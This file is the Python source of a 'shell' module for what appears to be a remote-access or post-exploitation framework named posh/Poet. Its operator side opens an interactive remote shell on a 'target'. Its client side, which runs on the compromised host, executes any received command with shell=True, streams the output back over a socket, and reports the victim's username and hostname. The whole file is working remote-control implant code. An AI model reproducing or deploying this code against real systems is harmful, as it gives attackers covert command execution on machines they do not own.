import module

import re
import os
import select
import subprocess as sp

MODNAME = 'shell'
POSH_PROMPT = 'posh > '
USAGE = """Remote shell on target.
usage: shell [-h]
\noptions:
-h\t\tshow help"""


@module.server_handler(MODNAME)
def server(server, argv):
    if len(argv) > 1:
        print USAGE
        return

    prompt = server.conn.exchange('getprompt')
    while True:
        try:
            inp = raw_input(POSH_PROMPT + prompt).strip()
        except KeyboardInterrupt:  # Ctrl-C -> new prompt
            print
            continue
        except EOFError:  # Ctrl-D -> exit shell
            print
            break

        if inp == '':
            continue
        elif inp == 'exit':
            break
        elif inp.split()[0] in module.server_commands.keys():
            print """[!] WARNING: You've entered a posh command into the real remote shell on the
target. Continue? (y/n)""",
            if raw_input().lower()[0] != 'y':
                continue

        server.conn.send('shell {}'.format(inp))
        try:
            while True:
                rec = server.conn.recv()
                if rec == 'shelldone':
                    break
                else:
                    print rec,
        except KeyboardInterrupt:
            server.conn.send('shellterm')
            # flush lingering socket buffer ('shelldone' and any
            # excess data) and sync client/server
            while server.conn.recv() != 'shelldone':
                pass
            print
            continue


@module.client_handler(MODNAME)
def client(client, inp):
    """Posh `shell' command client-side.

    Create a subprocess for command and line buffer command output to
    server while listening for signals from server.

    Args:
        s: PoetSocketClient instance
    """

    # get rid of 'shell ' prefix sent from client
    inp = inp[6:]

    # handle cd builtin
    _inp = inp.split()
    if _inp[0] == 'cd':
        if len(_inp) == 1:
            os.chdir(os.path.expanduser('~'))
        else:
            try:
                os.chdir(os.path.expanduser(_inp[1]))
            except OSError as e:
                client.s.send('cd: {}\n'.format(e.strerror))
        shelldone(client)
        return

    # everything else
    proc = sp.Popen(inp, stdout=sp.PIPE, stderr=sp.STDOUT, shell=True)
    while True:
        readable = select.select([proc.stdout, client.s.s], [], [], 30)[0]
        for fd in readable:
            if fd == proc.stdout:  # proc has stdout/err to send
                output = proc.stdout.readline()
                if output:
                    client.s.send(output)
                else:
                    shelldone(client)
                    return
            elif fd == client.s.s:  # remote signal from server
                sig = client.s.recv()
                if sig == 'shellterm':
                    proc.terminate()
                    shelldone(client)
                    return


@module.client_handler('getprompt')
def get_prompt(client, argv):
    """Create shell prompt.

    Using current user and hostname, create shell prompt for server `shell'
    command.
    """
    user = client.cmd_exec('whoami').strip()
    hn = client.cmd_exec('hostname').strip()
    end = '#' if user == 'root' else '$'
    client.s.send('{}@{} {} '.format(user, hn, end))


def shelldone(client):
    client.s.send('shelldone')
